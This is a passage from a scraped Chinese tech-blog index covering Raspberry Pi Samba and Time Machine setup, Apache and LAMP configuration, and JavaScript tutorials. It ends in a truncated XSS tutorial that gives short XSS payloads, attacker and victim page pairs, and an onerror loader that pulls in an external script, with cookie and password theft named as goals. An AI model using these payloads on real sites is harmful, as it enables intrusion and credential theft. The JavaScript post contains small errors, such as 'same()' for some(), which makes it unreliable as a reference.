style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 安装samba 1 apt-get install samba samba-common-bin 修改samba配置文件\n1 vi /etc/samba/smb.conf 添加共享配置信息\n1 \\[BackupFolder\\] (共享名字) comment = Backup Folder path = /srv/samba (路径) valid users = @users force group = users create mask = 0660 directory mask = 0771 read only = no 添加samba用户\n1 useradd backuser -m -G userspasswd backuser smbpasswd -a backuser 重启服务\n1 /etc/init.d/samba restart timemachine搭建\n安装必要的软件： 1 apt-get install hfsplus hfsutils hfsprogs 挂载目录：\n1 mount -t hfsplus /dev/sda2 /src/timemacheine 修改目录的所属组、所有者：\n1 chown -R pi:pi /srv/timemacheine 查看是否成功挂载，lsblk结果：\n1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part /src/samba (已挂载成功) `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /src/timemacheine (已挂载成功) mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 安装Netatalk Netatalk 是一个开源的 AppleTalk 通信协议的实现，Linux 系统通过它可以充当 Mac 的文件服务器 、AppleTalk 路由、打印服务器等。 安装：\n1 apt-get install netatalk 把最先设置的目录添加到配置文件:\n1 echo “/srv/timemacheine ”TimeMacheine” options:tm” \u0026gt;\u0026gt; /etc/netatalk/AppleVolumes.default 或者\n1 vi /etc/netatalk/AppleVolumes.default 然后把/srv/timemacheine “TimeMacheine” options:tm 添加到最后 这里可以把samba服务器也设置进来，这样就可以统一访问\n1 vi /etc/netatalk/AppleVolumes.default 然后把/srv/samba “samba” options:tm 添加到最后\n安装avahi-daemon和libnss-mdns 添加Avahi工具让Mac电脑可以在Finder工具栏的共享里发现磁盘\n1 apt-get install avahi-daemon libnss-mdns 配置nsswitch.conf文件，在原有的hosts行后面添加 mdns\n1 hosts: files mdns4\\_minimal \\[NOTFOUND=return\\] dns mdns4 mdns 让Avahi在局域网广播AFP共享:\n1 vi /etc/avahi/services/afpd.service 添加如下内容\n1 \u0026lt;?xml version=”1.0″ standalone=’no’?\u0026gt; 2 \u0026lt;!\\-\\*-nxml-\\*-\\\u0026gt; 3 \u0026lt;!DOCTYPE service-group SYSTEM “avahi-service.dtd”\\\u0026gt; 4 \u0026lt;service-group\\\u0026gt; 5 \u0026lt;name replace-wildcards\\=\u0026#34;”yes”\u0026#34;\\\u0026gt;%h\u0026lt;/name\\\u0026gt; 6 \u0026lt;service\\\u0026gt; 7 \u0026lt;type\\\u0026gt;\\_afpovertcp.\\_tcp\u0026lt;/type\\\u0026gt; 8 \u0026lt;port\\\u0026gt;548\u0026lt;/port\\\u0026gt; 9 \u0026lt;/service\\\u0026gt; 10 \u0026lt;service\\\u0026gt; 11 \u0026lt;type\\\u0026gt;\\_device-info.\\_tcp\u0026lt;/type\\\u0026gt; 12 \u0026lt;port\\\u0026gt;0\u0026lt;/port\\\u0026gt; 13 \u0026lt;txt-record\\\u0026gt;model=Xserve\u0026lt;/txt-record\\\u0026gt; 14 \u0026lt;/service\\\u0026gt; 15 \u0026lt;/service-group\\\u0026gt; 重启avahi服务\n1 /etc/init.d/avahi-daemon restart ","permalink":"/posts/raspberrypi-timemachine-samba/","summary":"最近一段时间感觉用移动硬盘备份Mac电脑很不方便，因为要把移动硬盘拿出来，还要插上电脑备份，看了一下AirPort，但是价钱太贵，况且只能用于Mac备份并不能用于其他的Samba服务等，感觉不太划算，于是打算自己做一个TimeMacheine以及samba服务，TimeMacheine服务主要用于Mac备份，而samba用于局域网内的电脑上的一些文件存放。\n准备工作： 1、树莓派\n2、移动硬盘\n3、5V电源适配器以及连接线\n4、无线USB网卡或者有线\n5、SD卡（新版本的是TF卡）\n6、操作系统，关于操作系统，你可以到raspberry官方网站进行下载并通过win32diskimager软件进行写入。\n在这里我自己的设备信息为： 1、树莓派2代\n2、西数移动硬盘2TB自带电源\n3、5V电源适配器以及连接线\n4、有线网络\n5、SD卡16GB金士顿\n6、raspbian操作系统\n查看自己的移动硬盘是否加载，lsblk结果： 1 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 1.8T 0 disk |-sda1 8:1 0 977.9G 0 part `-sda2 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;8\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;2\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;885\u0026lt;/span\u0026gt;.1G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part mmcblk0 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;14\u0026lt;/span\u0026gt;.6G \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; disk |-mmcblk0p1 \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;179\u0026lt;/span\u0026gt;:\u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;1\u0026lt;/span\u0026gt; \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; 56M \u0026lt;span style=\u0026#34;color:#800080;\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt; part /boot` \\-mmcblk0p2 179:2 0 3G 0 part / 在这里我是把我的硬盘分为两个分区，/dev/sda1 为ntfs格式、/dev/sda2 为 hfs格式，如果你需要进行分区可以通过fdisk以及cfdisk进行分区。","title":"树莓派实现TimeMachine以及samba服务"},{"content":"root权限下运行a2enmod（a2enmod是一个可以配置Apache的工具，a2enmod是属于apache2.2-common包下的一个工具），然后输入rewrite启动apache对于.htaccess的支持。\n1 a2enmod rewrite 在debian下默认的httpd.conf文件是空的，如果需要对相应目录设置AllowOverride，可以直接进入：\n1 /etc/apache2/sites-enabled/000\\-default 可以按照要求把需要支持的地方的AllowOverride None改为AllowOverride All，如下例中：\n1 \u0026lt;VirtualHost \\*:80\\\u0026gt; 2 ServerAdmin \\*@localhost 3 4 DocumentRoot /var/www 5 6 Options FollowSymLinks 7 AllowOverride All 8 9 10 Options Indexes FollowSymLinks MultiViews 11 AllowOverride All 12 Order allow,deny 13 allow from all 14 15 16 ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ 17 18 AllowOverride None 19 Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch 20 Order allow,deny 21 Allow from all 22 23 24 ErrorLog ${APACHE\\_LOG\\_DIR}/error.log 25 26 # Possible values include: debug, info, notice, warn, error, crit, 27 \\# alert, emerg. 28 LogLevel warn 29 30 CustomLog ${APACHE\\_LOG\\_DIR}/access.log combined 31 ","permalink":"/posts/apache-setting-access/","summary":"root权限下运行a2enmod（a2enmod是一个可以配置Apache的工具，a2enmod是属于apache2.2-common包下的一个工具），然后输入rewrite启动apache对于.htaccess的支持。\n1 a2enmod rewrite 在debian下默认的httpd.conf文件是空的，如果需要对相应目录设置AllowOverride，可以直接进入：\n1 /etc/apache2/sites-enabled/000\\-default 可以按照要求把需要支持的地方的AllowOverride None改为AllowOverride All，如下例中：\n1 \u0026lt;VirtualHost \\*:80\\\u0026gt; 2 ServerAdmin \\*@localhost 3 4 DocumentRoot /var/www 5 6 Options FollowSymLinks 7 AllowOverride All 8 9 10 Options Indexes FollowSymLinks MultiViews 11 AllowOverride All 12 Order allow,deny 13 allow from all 14 15 16 ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ 17 18 AllowOverride None 19 Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch 20 Order allow,deny 21 Allow from all 22 23 24 ErrorLog ${APACHE\\_LOG\\_DIR}/error.","title":"服务器设置Apache对htaccess支持"},{"content":"以下操作均在Debian 6.0 64bit 环境root权限下进行，如果提示权限不足请切换至root用户或者sudo，本人比较喜欢自行安装，因为安装的过程中能最小化安装而且能够知道安装了什么，然后可以根据自己的需要进行扩展功能。 安装chkconfig,chkconfig是Red Hat 公司开发的一款用于检查设置系统服务的工具。可以用它来设置一些开机启动。其他的命令以及说明\n1 apt-get install chkconfig 安装Apache:\n1 apt-get install apache2 chkconfig apache2 on 设置Apache2开机启动 或者安装Apache1 apt-get install apache 关于基本的配置文件以及知识，建议大家进行阅读。请点击\n安装Mysql，当然你也可以根据需求的版本进行安装，在debian中直接输入下面语句安装的话是安装last版本，也就是最新的版本。\n1 apt-get install mysql-server chkconfig mysql-server on 设置MySQL开机启动 安装Php:\n1 apt-get install php5 安装其他版本替换后面的版本号即可 安装PHP MySQL扩展，关于其他的组件建议大家在需要的时候进入安装，这样才能清楚的知道这些组件的功能\n1 apt-get install php5-mysql ","permalink":"/posts/apache-mysql-php-server/","summary":"以下操作均在Debian 6.0 64bit 环境root权限下进行，如果提示权限不足请切换至root用户或者sudo，本人比较喜欢自行安装，因为安装的过程中能最小化安装而且能够知道安装了什么，然后可以根据自己的需要进行扩展功能。 安装chkconfig,chkconfig是Red Hat 公司开发的一款用于检查设置系统服务的工具。可以用它来设置一些开机启动。其他的命令以及说明\n1 apt-get install chkconfig 安装Apache:\n1 apt-get install apache2 chkconfig apache2 on 设置Apache2开机启动 或者安装Apache1 apt-get install apache 关于基本的配置文件以及知识，建议大家进行阅读。请点击\n安装Mysql，当然你也可以根据需求的版本进行安装，在debian中直接输入下面语句安装的话是安装last版本，也就是最新的版本。\n1 apt-get install mysql-server chkconfig mysql-server on 设置MySQL开机启动 安装Php:\n1 apt-get install php5 安装其他版本替换后面的版本号即可 安装PHP MySQL扩展，关于其他的组件建议大家在需要的时候进入安装，这样才能清楚的知道这些组件的功能\n1 apt-get install php5-mysql ","title":"配置Apache+Mysql+Php"},{"content":"在ECMAScript中提供了Boolean()转换函数以及三个布尔操作符，这三个布尔操作符分别为逻辑非、逻辑与、逻辑或，这三个操作符通常用作于某些值的求反，比较模式等。学好这一点知识也非常的重要，奠定了以后在一些比较模式中基础。\nBoolean()转型函数 Boolean()转型函数可以对任何类型的值进行转换为一个有效的布尔值，它的转换规则如下： 1、Boolean值：true转换结果为true，false转换结果为false。\n2、String值：非空字符转换为true，空字符转换为false。\n3、Number值：任何非零数值以及Infinity转换为true，零以及NaN转换为false。\n4、Object值：任何对象转换为true，null转换为false。\n5、Undefined：所有Undefined值均转换为false。\n逻辑非(!) 逻辑非只有一个操作数，逻辑非由一个感叹号组成，逻辑非可以应用于所有类型的值并且返回一个布尔值，逻辑非在进行操作的时候首先会利用Boolean()转型函数对操作数进行转换为一个布尔值，然后在对其值进行求反并返回这个布尔值。如：\n1 var test1 = null; var test2 = “xsscript”; 2 var test3 = 123; 3 !test1; 返回true; 4 !test2; 返回false; 5 !test3; 返回false; 逻辑与(\u0026amp;\u0026amp;) 逻辑与有两个操作数，逻辑与由两个和符号构成”\u0026amp;\u0026amp;”，逻辑与是一个短路操作，也就是它有些时候可以通过一边的值来确定结果。逻辑与对于布尔值的运算规则如下：\n第一个值为true的时候，会对第二个值进行判断，如果第二个值为true则返回true，如果第二个值为false则返回false。\n如果两个值中第一个值是false逻辑与运算就不继续判断第二个值了，因为判断第二个值是属于无意义的，就算第二个值是true也不能改变结果。\n逻辑与对于其他类型值的操作返回的值和上面的规则很相似，但是返回的值是操作值的类型，可以这样来想”在逻辑与进行其他类型值运算的时候，在内部隐式的用Boolean()转型函数转换为布尔值，然后对其进行运算，但是返回的值还是原操作数值”。逻辑与对于其他类型值的运算规则其实可以用前一段话来想，然后对其用布尔值的方式进行运算，就很简单的理解了逻辑与操作符。\n逻辑与的运算规则如下：\n两个操作数都为true的时候返回第二个操作数原值\n第一个操作数为false的时候返回第一个操作数原值\n第二个操作数为false的时候返回第二个操作数原值\n逻辑或(||) 逻辑或有两个操作数，逻辑或由两个竖线符号构成”||”，逻辑或是一个短路操作，也就是它有些时候可以通过一边的值来确定结果。逻辑或对于布尔值的运算规则如下：\n第一个值为true的时候，则返回true，因为第二个值就算为false也不会对结果产生影响。\n第一个值是false逻辑或会继续对第二个值进行判断，如果第二个值为true则返回true，如果第二个值为false，则返回false。\n逻辑或对于其他类型值的操作返回的值和上面的规则很相似，但是返回的值是操作值的类型，可以这样来想”在逻辑或进行其他类型值运算的时候，在内部隐式的用Boolean()转型函数转换为布尔值，然后对其进行运算，但是返回的值还是原操作数值”。逻辑或对于其他类型值的运算规则其实可以用前一段话来想，然后对其用布尔值的方式进行运算，就很简单的理解了逻辑或操作符。\n逻辑或的运算规则如下：\n第一个操作数为true的时候则返回第一个操作数原值 第一个操作数为false的时候\n第二个操作数为true则返回第二个操作数原值\n两个数都为false的时候则返回第二个操作数原值。\n","permalink":"/posts/javascript-bool/","summary":"在ECMAScript中提供了Boolean()转换函数以及三个布尔操作符，这三个布尔操作符分别为逻辑非、逻辑与、逻辑或，这三个操作符通常用作于某些值的求反，比较模式等。学好这一点知识也非常的重要，奠定了以后在一些比较模式中基础。\nBoolean()转型函数 Boolean()转型函数可以对任何类型的值进行转换为一个有效的布尔值，它的转换规则如下： 1、Boolean值：true转换结果为true，false转换结果为false。\n2、String值：非空字符转换为true，空字符转换为false。\n3、Number值：任何非零数值以及Infinity转换为true，零以及NaN转换为false。\n4、Object值：任何对象转换为true，null转换为false。\n5、Undefined：所有Undefined值均转换为false。\n逻辑非(!) 逻辑非只有一个操作数，逻辑非由一个感叹号组成，逻辑非可以应用于所有类型的值并且返回一个布尔值，逻辑非在进行操作的时候首先会利用Boolean()转型函数对操作数进行转换为一个布尔值，然后在对其值进行求反并返回这个布尔值。如：\n1 var test1 = null; var test2 = “xsscript”; 2 var test3 = 123; 3 !test1; 返回true; 4 !test2; 返回false; 5 !test3; 返回false; 逻辑与(\u0026amp;\u0026amp;) 逻辑与有两个操作数，逻辑与由两个和符号构成”\u0026amp;\u0026amp;”，逻辑与是一个短路操作，也就是它有些时候可以通过一边的值来确定结果。逻辑与对于布尔值的运算规则如下：\n第一个值为true的时候，会对第二个值进行判断，如果第二个值为true则返回true，如果第二个值为false则返回false。\n如果两个值中第一个值是false逻辑与运算就不继续判断第二个值了，因为判断第二个值是属于无意义的，就算第二个值是true也不能改变结果。\n逻辑与对于其他类型值的操作返回的值和上面的规则很相似，但是返回的值是操作值的类型，可以这样来想”在逻辑与进行其他类型值运算的时候，在内部隐式的用Boolean()转型函数转换为布尔值，然后对其进行运算，但是返回的值还是原操作数值”。逻辑与对于其他类型值的运算规则其实可以用前一段话来想，然后对其用布尔值的方式进行运算，就很简单的理解了逻辑与操作符。\n逻辑与的运算规则如下：\n两个操作数都为true的时候返回第二个操作数原值\n第一个操作数为false的时候返回第一个操作数原值\n第二个操作数为false的时候返回第二个操作数原值\n逻辑或(||) 逻辑或有两个操作数，逻辑或由两个竖线符号构成”||”，逻辑或是一个短路操作，也就是它有些时候可以通过一边的值来确定结果。逻辑或对于布尔值的运算规则如下：\n第一个值为true的时候，则返回true，因为第二个值就算为false也不会对结果产生影响。\n第一个值是false逻辑或会继续对第二个值进行判断，如果第二个值为true则返回true，如果第二个值为false，则返回false。\n逻辑或对于其他类型值的操作返回的值和上面的规则很相似，但是返回的值是操作值的类型，可以这样来想”在逻辑或进行其他类型值运算的时候，在内部隐式的用Boolean()转型函数转换为布尔值，然后对其进行运算，但是返回的值还是原操作数值”。逻辑或对于其他类型值的运算规则其实可以用前一段话来想，然后对其用布尔值的方式进行运算，就很简单的理解了逻辑或操作符。\n逻辑或的运算规则如下：\n第一个操作数为true的时候则返回第一个操作数原值 第一个操作数为false的时候\n第二个操作数为true则返回第二个操作数原值\n两个数都为false的时候则返回第二个操作数原值。","title":"javscript布尔操作符"},{"content":"迭代方法 在Javascript中迭代方法个人觉得尤为重要，在很多时候都会有实际上的需求，javascript提供了5个迭代方法来供我们操作，它们分别为：\nevery() 对数组中的每一个项运用给定的函数，如果每项都返回true，那么就会返回true\nfilter() 对数组中的每一个项运用给定的函数，把返回true的项组成一个新数组并返回\nforEach() 对数组中的每一项运用给定的函数，但是没有任何的返回值\nmap() 对数组中的每一个项运用给定的函数并返回每次函数调用的结果组成新的数组\nsame() 对数组中的每一个项运用给定的函数，如果数组中有一项返回true，那么就返回true\n上面的5个方法中，它们都接受两个参数： 执行函数，也就是需要对每一个项进行操作的函数，这个函数有三个参数：数组项的值、该项在数组中的位置、数组对象本身。 给定的作用域，给定一个作用域，影响给定函数的this对象。如： 1 var values = \\[5,6,7,8,9,10,11,12,13\\]; 2 3 function actionfunc(item, index, array){console.log(this)}; 4 5 values.every(actionfunc,document); //这里会向控制台输出6次document对象 归并方法 除了迭代的方法之外还，javascript还提供了两个归并的方法，归并就是归档合并，这些方法和名字一样，都会利用给定的函数迭代数组中的每一项，然后返回一个总值。这两个归并的方法分别为：\nreduce() 在数组中项从第一个开始一直到最后一个顺向的对数组中的每一个项运用给定的函数，然后返回一个对数组所有项运行给定函数结果的总和。\nreduceRight() 在数组中项从最后一个开始一直到第一个逆向的运用给定的函数，然后返回一个对数组所有项运行给定函数结果的总和。\n上面的两个方法接受两个参数： 执行函数，也就是需要对每一个项进行操作的函数，这个函数有四个参数：前一个值、当前值、项的索引、数组对象本身。 归并的基值，归并的计算将以此值为基础进行计算。如： 1 var values = \\[5, 6, 7, 8, 9, 10, 11, 12, 13\\]; 2 3 values.reduce(function(preitem,item,index,array){return preitem+item},2) //返回数值83 ","permalink":"/posts/javascript-reduce/","summary":"迭代方法 在Javascript中迭代方法个人觉得尤为重要，在很多时候都会有实际上的需求，javascript提供了5个迭代方法来供我们操作，它们分别为：\nevery() 对数组中的每一个项运用给定的函数，如果每项都返回true，那么就会返回true\nfilter() 对数组中的每一个项运用给定的函数，把返回true的项组成一个新数组并返回\nforEach() 对数组中的每一项运用给定的函数，但是没有任何的返回值\nmap() 对数组中的每一个项运用给定的函数并返回每次函数调用的结果组成新的数组\nsame() 对数组中的每一个项运用给定的函数，如果数组中有一项返回true，那么就返回true\n上面的5个方法中，它们都接受两个参数： 执行函数，也就是需要对每一个项进行操作的函数，这个函数有三个参数：数组项的值、该项在数组中的位置、数组对象本身。 给定的作用域，给定一个作用域，影响给定函数的this对象。如： 1 var values = \\[5,6,7,8,9,10,11,12,13\\]; 2 3 function actionfunc(item, index, array){console.log(this)}; 4 5 values.every(actionfunc,document); //这里会向控制台输出6次document对象 归并方法 除了迭代的方法之外还，javascript还提供了两个归并的方法，归并就是归档合并，这些方法和名字一样，都会利用给定的函数迭代数组中的每一项，然后返回一个总值。这两个归并的方法分别为：\nreduce() 在数组中项从第一个开始一直到最后一个顺向的对数组中的每一个项运用给定的函数，然后返回一个对数组所有项运行给定函数结果的总和。\nreduceRight() 在数组中项从最后一个开始一直到第一个逆向的运用给定的函数，然后返回一个对数组所有项运行给定函数结果的总和。\n上面的两个方法接受两个参数： 执行函数，也就是需要对每一个项进行操作的函数，这个函数有四个参数：前一个值、当前值、项的索引、数组对象本身。 归并的基值，归并的计算将以此值为基础进行计算。如： 1 var values = \\[5, 6, 7, 8, 9, 10, 11, 12, 13\\]; 2 3 values.reduce(function(preitem,item,index,array){return preitem+item},2) //返回数值83 ","title":"Javascript中的迭代、归并方法"},{"content":"描述 作者：xsscript(原网名：crackkay)\n漏洞已经报国家漏洞平台，并已Fix漏洞，所以公布文章用于记录\n其实这个终端之前还有一个漏洞，没有报上来，过了一个月也就是今天，试了一下，不行了，应该修复了，但是今天又看见了一个漏洞，所以就报上来了，本来说照一个全过程的，但是后来保安问我在干什么，于是我就走了。漏洞可以直接进主机，还有很多文件。如果对于只是玩玩的人就没有什么，如果有心的话危害还是比较大吧。\n正文 首先连续点击那个什么广告的时候，会出现itunes播放器的错误，在这里，我点击了显示问题详细信息。\n我点击了里面给的两个连接，一个是超链接，一个是txt的连接。然后我点击了关闭程序，就会出现如下画面。\n然后下面就是一些列的操作和演示\n","permalink":"/posts/subway-entertainment-terminal-security/","summary":"描述 作者：xsscript(原网名：crackkay)\n漏洞已经报国家漏洞平台，并已Fix漏洞，所以公布文章用于记录\n其实这个终端之前还有一个漏洞，没有报上来，过了一个月也就是今天，试了一下，不行了，应该修复了，但是今天又看见了一个漏洞，所以就报上来了，本来说照一个全过程的，但是后来保安问我在干什么，于是我就走了。漏洞可以直接进主机，还有很多文件。如果对于只是玩玩的人就没有什么，如果有心的话危害还是比较大吧。\n正文 首先连续点击那个什么广告的时候，会出现itunes播放器的错误，在这里，我点击了显示问题详细信息。\n我点击了里面给的两个连接，一个是超链接，一个是txt的连接。然后我点击了关闭程序，就会出现如下画面。\n然后下面就是一些列的操作和演示","title":"成都地铁终端设备沙盒破解进入系统"},{"content":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;svg/onload=eval(name)\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S3:然后运行页面，测试结果如下：\n\u0026lt;i/onclick=URL=name\u0026gt;\nS1:上面的代码文译一下：\n\u0026lt;i/onclick=document.URL=window.name\u0026gt;\nS2:其实这段代码和上一段差不多多少，这里就不截图了，简单的讲解一下。通过点击执行事件把window.name的内容给document.URL然后执行javascript代码。那么我们可以怎么利用呢？\n存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;i/onclick=URL=name\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;img src=x onerror=eval(name)\u0026gt; S1:先把代码文译一下：\n\u0026lt;img src=x onerror=eval(window.name)\u0026gt;\nS2:邪恶的eval又来了。通过img元素的src属性出错，执行onerror事件，通过邪恶的eval执行window.name里面的代码。\nS3:那我们怎么来实现呢？\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; 站长统计 存在缺陷的XSS页面如下： \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;s.sx\u0026#34; onerror=eval(name) /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 其实有很多用法，当然你也可以直接:\n\u0026lt;img src=x onerror=eval(alert(1)) /\u0026gt;\n还可以\n\u0026lt;img src=x onerror=eval(变量) /\u0026gt;\n还可以通过调用元素属性，或者是程序员自写的js代码\n\u0026lt;img src=x onerror=with(body)createElement(\u0026#39;script\u0026#39;).src=\u0026#39;[JS地址]\u0026#39;\u0026gt; S1:通过img元素的src属性出错，执行onerror事件.\nS2:用with定位到body，通过DOM的一个createElement方法创建一个script元素，并使用script的src属性指向需要调用的外部js文件。从而达到攻击的目的。\nS3:这个就不讲解了，都应该能够看懂\n0x03 